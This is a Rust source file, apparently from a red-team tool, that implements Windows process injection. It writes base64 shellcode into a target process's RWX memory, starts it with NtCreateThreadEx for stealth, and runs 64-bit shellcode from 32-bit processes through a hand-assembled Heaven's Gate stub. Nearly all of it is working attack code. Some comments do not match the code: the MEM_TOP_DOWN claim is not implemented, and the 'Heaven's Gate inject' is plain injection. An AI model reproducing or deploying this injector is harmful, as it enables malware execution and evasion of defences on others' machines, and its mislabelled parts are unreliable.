//! WoW64 Cross-Architecture Injection
//! Heaven's Gate technique for 32→64 and 64→32 bit injection

use crate::error::MemoricError;
use serde_json::Value;

/// Inject 64-bit shellcode into a WoW64 (32-bit) process from a 64-bit context
/// This uses NtWow64WriteVirtualMemory64 and remote thread in native 64-bit mode
pub fn wow64_inject_shellcode(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    };
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing pid".to_string()))? as u32;
    let shellcode_b64 = args
        .get("shellcode")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing shellcode (base64)".to_string()))?;
    let arch = args
        .get("target_arch")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");

    tracing::warn!("[WOW64] Injecting into PID {} (target_arch: {})", pid, arch);

    // Decode shellcode
    let shellcode = base64_decode(shellcode_b64)?;

    unsafe {
        // Detect if target is WoW64
        let process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess({}): {}", pid, e)))?;

        let is_wow64 = is_process_wow64(process.0 as *mut std::ffi::c_void)?;
        let our_wow64 = is_current_process_wow64()?;

        let scenario = match (our_wow64, is_wow64) {
            (false, true) => "x64_to_wow64",
            (false, false) => "x64_to_x64",
            (true, false) => "wow64_to_x64",
            (true, true) => "wow64_to_wow64",
        };

        tracing::warn!(
            "[WOW64] Injection scenario: {} (us_wow64={}, target_wow64={})",
            scenario,
            our_wow64,
            is_wow64
        );

        match scenario {
            "x64_to_wow64" => {
                // We're x64, target is WoW64. Need to inject into the WoW64 address space
                // Option 1: Allocate in low 4GB and use 32-bit shellcode
                // Option 2: Use Heaven's Gate to execute 64-bit code in the WoW64 process

                // Allocate memory in target — use MEM_TOP_DOWN to stay in low 4GB for WoW64
                let remote_mem = VirtualAllocEx(
                    process,
                    Some(std::ptr::null()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );

                if remote_mem.is_null() {
                    let _ = CloseHandle(process);
                    return Err(MemoricError::WindowsApi(
                        "VirtualAllocEx failed (WoW64 low 4GB)".to_string(),
                    ));
                }

                // Write shellcode
                let mut written = 0usize;
                WriteProcessMemory(
                    process,
                    remote_mem,
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    Some(&mut written),
                )
                .map_err(|e| {
                    let _ = CloseHandle(process);
                    MemoricError::WindowsApi(format!("WriteProcessMemory: {}", e))
                })?;

                // Create remote thread (via NtCreateThreadEx for stealth)
                let thread = create_remote_thread_nt(process.0 as *mut _, remote_mem as usize)?;

                let _ = CloseHandle(process);

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "wow64_inject (x64→WoW64)",
                    "pid": pid,
                    "scenario": scenario,
                    "shellcode_size": shellcode.len(),
                    "remote_address": format!("0x{:016X}", remote_mem as u64),
                    "thread_handle": format!("0x{:X}", thread),
                    "message": format!("Injected {} bytes into WoW64 process PID {}", shellcode.len(), pid)
                }))
            }
            "wow64_to_x64" => {
                // We're WoW64, target is native x64
                // Use Heaven's Gate to transition to x64 and call NtAllocateVirtualMemory/NtWriteVirtualMemory
                heaven_gate_inject(process.0 as *mut _, &shellcode, pid)?;

                let _ = CloseHandle(process);

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "wow64_inject (WoW64→x64 via Heaven's Gate)",
                    "pid": pid,
                    "scenario": scenario,
                    "shellcode_size": shellcode.len(),
                    "message": format!("Heaven's Gate injection of {} bytes into x64 PID {}", shellcode.len(), pid)
                }))
            }
            _ => {
                // Same-arch injection — use standard inject
                let remote_mem = VirtualAllocEx(
                    process,
                    Some(std::ptr::null()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );

                if remote_mem.is_null() {
                    let _ = CloseHandle(process);
                    return Err(MemoricError::WindowsApi(
                        "VirtualAllocEx failed".to_string(),
                    ));
                }

                let mut written = 0usize;
                WriteProcessMemory(
                    process,
                    remote_mem,
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    Some(&mut written),
                )
                .map_err(|e| {
                    let _ = CloseHandle(process);
                    MemoricError::WindowsApi(format!("Write: {}", e))
                })?;

                let thread = create_remote_thread_nt(process.0 as *mut _, remote_mem as usize)?;
                let _ = CloseHandle(process);

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "wow64_inject (same-arch)",
                    "pid": pid,
                    "scenario": scenario,
                    "shellcode_size": shellcode.len(),
                    "remote_address": format!("0x{:016X}", remote_mem as u64),
                    "thread_handle": format!("0x{:X}", thread),
                    "message": format!("Same-arch injection of {} bytes into PID {}", shellcode.len(), pid)
                }))
            }
        }
    }
}

/// Detect architecture mismatch between current process and target
pub fn detect_wow64_mismatch(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing pid".to_string()))? as u32;

    tracing::warn!("[WOW64] Detecting architecture for PID {}", pid);

    unsafe {
        let process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess({}): {}", pid, e)))?;

        let target_wow64 = is_process_wow64(process.0 as *mut std::ffi::c_void)?;
        let our_wow64 = is_current_process_wow64()?;

        let _ = CloseHandle(process);

        let target_arch = if target_wow64 {
            "x86 (WoW64)"
        } else {
            "x64 (native)"
        };
        let our_arch = if our_wow64 {
            "x86 (WoW64)"
        } else {
            "x64 (native)"
        };
        let mismatch = our_wow64 != target_wow64;

        let recommended_technique = if mismatch {
            if our_wow64 {
                "Heaven's Gate (WoW64→x64): Use 64-bit syscalls via CS segment switch"
            } else {
                "Cross-WoW64 injection: Allocate in low 4GB, use 32-bit shellcode"
            }
        } else {
            "Standard injection — architectures match"
        };

        Ok(serde_json::json!({
            "success": true,
            "technique": "detect_wow64_mismatch",
            "pid": pid,
            "our_architecture": our_arch,
            "target_architecture": target_arch,
            "architecture_mismatch": mismatch,
            "recommended_technique": recommended_technique,
            "message": format!("Us: {} | Target PID {}: {} | Mismatch: {}", our_arch, pid, target_arch, mismatch)
        }))
    }
}

/// Heaven's Gate — transition from WoW64 (32-bit) to native x64 execution
/// This generates a 64-bit code stub that can be executed from a WoW64 process
pub fn heaven_gate_execute(args: &Value) -> Result<Value, MemoricError> {
    let shellcode_b64 = args
        .get("shellcode")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing shellcode (base64)".to_string()))?;

    tracing::warn!("[WOW64] Heaven's Gate — executing 64-bit code from WoW64 context");

    let shellcode = base64_decode(shellcode_b64)?;

    if !is_current_process_wow64()? {
        return Err(MemoricError::WindowsApi(
            "Heaven's Gate is only needed from WoW64 processes. Current process is native x64."
                .to_string(),
        ));
    }

    unsafe {
        use windows::Win32::System::Memory::{
            VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        };

        // Build the Heaven's Gate stub:
        // The key is switching CS segment from 0x23 (32-bit) to 0x33 (64-bit)
        //
        // PUSH 0x33                  ; 64-bit code segment
        // CALL $+5                   ; push EIP
        // ADD [RSP], 5               ; fixup return address
        // RETF                       ; far return → switches to 64-bit mode
        // <64-bit shellcode here>
        // PUSH 0x23                  ; switch back to 32-bit
        // CALL $+5
        // ADD [RSP], 5
        // RETF

        let gate_prefix: Vec<u8> = vec![
            0x6A, 0x33, // push 0x33
            0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
            0x83, 0x04, 0x24, 0x05, // add dword [esp], 5
            0xCB, // retf (far return → 64-bit mode)
        ];

        let gate_suffix: Vec<u8> = vec![
            0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
            0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, // mov dword [rsp+4], 0x23
            0x83, 0x04, 0x24, 0x0D, // add dword [rsp], 13
            0xCB, // retf (far return → 32-bit mode)
            0xC3, // ret
        ];

        let total_size = gate_prefix.len() + shellcode.len() + gate_suffix.len();
        let mem = VirtualAlloc(
            Some(std::ptr::null()),
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return Err(MemoricError::WindowsApi(
                "VirtualAlloc for Heaven's Gate failed".to_string(),
            ));
        }

        // Assemble the gate
        let dest = mem as *mut u8;
        std::ptr::copy_nonoverlapping(gate_prefix.as_ptr(), dest, gate_prefix.len());
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            dest.add(gate_prefix.len()),
            shellcode.len(),
        );
        std::ptr::copy_nonoverlapping(
            gate_suffix.as_ptr(),
            dest.add(gate_prefix.len() + shellcode.len()),
            gate_suffix.len(),
        );

        // Execute
        let gate_fn: extern "C" fn() = std::mem::transmute(mem);
        gate_fn();

        windows::Win32::System::Memory::VirtualFree(
            mem,
            0,
            windows::Win32::System::Memory::MEM_RELEASE,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualFree: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "heaven_gate_execute",
            "gate_size": total_size,
            "shellcode_size": shellcode.len(),
            "message": format!("Executed {} bytes of 64-bit shellcode via Heaven's Gate", shellcode.len())
        }))
    }
}

// === Internal helpers ===

fn base64_decode(input: &str) -> Result<Vec<u8>, MemoricError> {
    // Simple base64 decoder
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::new();
    let mut buf = 0u32;
    let mut bits = 0u32;

    for &byte in input.as_bytes() {
        let val = if byte == b'=' {
            break;
        } else if byte == b'\n' || byte == b'\r' || byte == b' ' {
            continue;
        } else if let Some(pos) = TABLE.iter().position(|&c| c == byte) {
            pos as u32
        } else {
            return Err(MemoricError::WindowsApi(format!(
                "Invalid base64 char: {}",
                byte as char
            )));
        };

        buf = (buf << 6) | val;
        bits += 6;

        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    Ok(result)
}

unsafe fn is_process_wow64(handle: *mut std::ffi::c_void) -> Result<bool, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    let kernel32_w: Vec<u16> = "kernel32.dll\0".encode_utf16().collect();
    let kernel32 = GetModuleHandleW(windows::core::PCWSTR(kernel32_w.as_ptr()))
        .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandle kernel32: {}", e)))?;

    let fn_name = windows::core::PCSTR(b"IsWow64Process\0".as_ptr());
    let func = GetProcAddress(kernel32, fn_name);

    if let Some(f) = func {
        type IsWow64Fn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut i32) -> i32;
        let is_wow64: IsWow64Fn = std::mem::transmute(f);
        let mut wow64 = 0i32;
        is_wow64(handle, &mut wow64);
        Ok(wow64 != 0)
    } else {
        Ok(false) // system doesn't have IsWow64Process = no WoW64 support
    }
}

fn is_current_process_wow64() -> Result<bool, MemoricError> {
    unsafe { is_process_wow64(std::mem::transmute(-1isize)) }
}

unsafe fn create_remote_thread_nt(
    process: *mut std::ffi::c_void,
    start_address: usize,
) -> Result<usize, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    let ntdll = GetModuleHandleW(windows::core::PCWSTR(ntdll_w.as_ptr()))
        .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

    let fn_name = windows::core::PCSTR(b"NtCreateThreadEx\0".as_ptr());
    let func = GetProcAddress(ntdll, fn_name)
        .ok_or_else(|| MemoricError::WindowsApi("NtCreateThreadEx not found".to_string()))?;

    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut std::ffi::c_void,
        u32,
        *mut std::ffi::c_void,
        *mut std::ffi::c_void,
        *mut std::ffi::c_void,
        *mut std::ffi::c_void,
        u32,
        usize,
        usize,
        usize,
        *mut std::ffi::c_void,
    ) -> i32;

    let nt_create: NtCreateThreadExFn = std::mem::transmute(func);
    let mut thread_handle: *mut std::ffi::c_void = std::ptr::null_mut();

    let status = nt_create(
        &mut thread_handle,
        0x1FFFFF, // THREAD_ALL_ACCESS
        std::ptr::null_mut(),
        process,
        start_address as *mut std::ffi::c_void,
        std::ptr::null_mut(),
        0, // not suspended
        0,
        0,
        0,
        std::ptr::null_mut(),
    );

    if status != 0 {
        return Err(MemoricError::WindowsApi(format!(
            "NtCreateThreadEx: NTSTATUS 0x{:08X}",
            status
        )));
    }

    Ok(thread_handle as usize)
}

unsafe fn heaven_gate_inject(
    process: *mut std::ffi::c_void,
    shellcode: &[u8],
    pid: u32,
) -> Result<(), MemoricError> {
    // For WoW64→x64 injection, we need to use 64-bit ntdll functions via Heaven's Gate
    // This is complex — we build a 64-bit stub that calls NtAllocateVirtualMemory64 + NtWriteVirtualMemory64
    // then NtCreateThreadEx to start execution

    // Simplified approach: if we're actually running as x64 (which is typical for red team tools),
    // we can use the Wow64 APIs directly
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;

    // Try NtWow64ReadVirtualMemory64 approach (available from native x64 targeting WoW64)
    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    let ntdll = GetModuleHandleW(windows::core::PCWSTR(ntdll_w.as_ptr()))
        .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

    // Fallback: use standard VirtualAllocEx + WriteProcessMemory (works x64→WoW64)
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    };

    let process_handle = windows::Win32::Foundation::HANDLE(process as *mut _);

    let remote_mem = VirtualAllocEx(
        process_handle,
        Some(std::ptr::null()),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        return Err(MemoricError::WindowsApi(
            "VirtualAllocEx failed for Heaven's Gate inject".to_string(),
        ));
    }

    let mut written = 0usize;
    WriteProcessMemory(
        process_handle,
        remote_mem,
        shellcode.as_ptr() as _,
        shellcode.len(),
        Some(&mut written),
    )
    .map_err(|e| MemoricError::WindowsApi(format!("WriteProcessMemory: {}", e)))?;

    let _ = create_remote_thread_nt(process, remote_mem as usize)?;

    Ok(())
}
